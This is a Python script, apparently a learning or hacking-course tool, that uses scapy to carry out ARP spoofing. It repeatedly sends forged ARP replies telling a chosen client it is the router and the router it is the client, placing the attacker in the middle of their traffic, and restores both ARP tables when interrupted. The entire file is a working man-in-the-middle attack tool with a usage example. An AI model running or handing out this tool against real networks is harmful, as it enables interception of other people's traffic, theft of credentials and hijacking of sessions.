import scapy.all as scapy
import optparse
import time

# python3 ARP_spoofing.py --client 192.168.233.136 --access-point 192.168.233.1


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(
        arp_request_broadcast,
        timeout=2,
        verbose=False)

    if answered_list:
        return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    print("[+] Sending packet to {}: `I am {}.`".format(
        target_ip, spoof_ip))

    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)

    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac_address(dst_ip)
    src_mac = get_mac_address(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip,
                       hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)

    scapy.send(packet, count=4, verbose=False)


def main():

    parser = optparse.OptionParser()

    parser.add_option("-c", "--client", dest="client",
                      help="Client IP.")

    parser.add_option("-a", "--access-point",
                      dest="access_point", help="Access point IP.")

    (options, arguments) = parser.parse_args()

    if not options.client:
        parser.error("Please specify an Client IP.")
    if not options.access_point:
        parser.error("Please specify an Access point IP.")

    client_ip = str(options.client)
    router_ip = str(options.access_point)

    try:
        while True:
            # Send to user, we are router.
            spoof(client_ip, router_ip)

            # Send packet to the router, we are user :))
            spoof(router_ip, client_ip)
            time.sleep(1)

    except KeyboardInterrupt:
        print("Quitting. Restore the ARP table on the user and router.")

        # Restore router ARP table.
        restore(client_ip, router_ip)
        # Restore client ARP table.
        restore(router_ip, client_ip)
        exit(0)


if __name__ == "__main__":
    main()
